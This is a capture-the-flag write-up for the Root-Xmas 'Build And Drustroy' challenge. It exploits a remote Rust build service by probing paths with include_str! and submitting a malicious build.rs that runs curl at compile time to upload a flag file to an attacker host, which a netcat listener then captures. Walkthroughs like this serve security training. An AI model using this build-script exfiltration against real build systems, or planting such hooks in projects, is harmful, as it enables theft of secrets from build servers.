---
layout: Post
format: chall
title: Day 04 - Build And Drustroy
date: 2024-12-14
ctf: Root-Xmas
tags: [Rust, Compile-Time, RCE, RFI]
category: [Misc]
---
# Day 04 - Build And Drustroy

<a class="back-link" href="../../">< Go back</a>

## Description

I love rust because it's secure and fast. So I want people to do MOAR rust.

That's why I made a microservice to allow fast and easy remote code compilation.

Send my your code, I'll compile it, and I know for sure I'm safe!

```bash
curl -sSk -X POST -H 'Content-Type: application/json' https://day4.challenges.xmas.root-me.org/remote-build -d '{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }"}' --output binary
# file binary # binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, ...
```

Author : Laluka
<https://day4.challenges.xmas.root-me.org/>

all files in [resources/](./resources) were provided.

## Challenge

### Trying blind path traversal

Using `include_str()` we can determine if a folder exists:

```bash
curl -sSk -X POST -H 'Content-Type: application/json' https://day4.challenges.xmas.root-me.org/remote-build -d '{"src/main.rs":"fn main() {compile_error!(include_str!(\"/flag/\"));}"}' --output binary
# Build failed:    Compiling temp_build v0.1.0 (/tmp/.tmp8Nink3)
# error: couldn't read `/flag/`: Is a directory (os error 21)
#  --> src/main.rs:1:27
# 1 | fn main() {compile_error!(include_str!("/flag/"));}
#   |                           ^^^^^^^^^^^^^^^^^^^^^^
#   = note: this error originates in the macro `include_str` (in Nightly builds, run with -Z macro-backtrace for more info)
# error: could not compile `temp_build` (bin "temp_build") due to 1 previous error
```

For example here with `include_str!("/flag")` we can see that the `/flag` folder exists.

This actually doesn't lead much further, so let's try something else.

### Using compile-time macros to RCE

So the idea is to use the `compile_error!` macro to execute code at compile time. We still need a `main.rs` file, but let's also send a `build.rs`

`buid.rs`:

```rust
use std::process::Command;

fn main(){
  Command::new("curl")
    .args(&["-F",
            "file=@/flag/randomflaglolilolbigbisous.txt",
            "http://<IP>:8889"])
    .status()
    .unwrap();
}
```

This function becomes the following JSON mess:

```json
{
  "build.rs": "use std::process::Command;fn main(){Command::new(\"curl\").args(&[\"-F\",\"file=@/flag/randomflaglolilolbigbisous.txt\",\"http://<IP>:8889\"]).status().unwrap();}",
  "src/main.rs": "fn main(){}"
}
```

Which then gets one-lined and shoved inside the demo curl command given in the description of the challenge:

```bash
curl -sSk -X POST -H 'Content-Type: application/json' <https://day4.challenges.xmas.root-me.org/remote-build> -d '{"build.rs":"use std::process::Command;fn main(){Command::new(\"curl\").args(&[\"-F\",\"file=@/flag/randomflaglolilolbigbisous.txt\",\"http://<IP>:8889\"]).status().unwrap();}","src/main.rs":"fn main(){}"}' --output binary
```

Before running the payload, we start our listener, and then run it!

```bash
nc -lnvp 8889
# Listening on 0.0.0.0 8889
# Connection received on 163.172.68.42 52674
# POST / HTTP/1.1
# Host: <IP>:8889
# User-Agent: curl/7.88.1
# Accept: */*
# Content-Length: 238
# Content-Type: multipart/form-data; boundary=------------------------e473020fb62116fc

# --------------------------e473020fb62116fc
# Content-Disposition: form-data; name="file"; filename="randomflaglolilolbigbisous.txt"
# Content-Type: text/plain

# OffenSkillSaysHi2024RustAbuse

# --------------------------e473020fb62116fc--
```
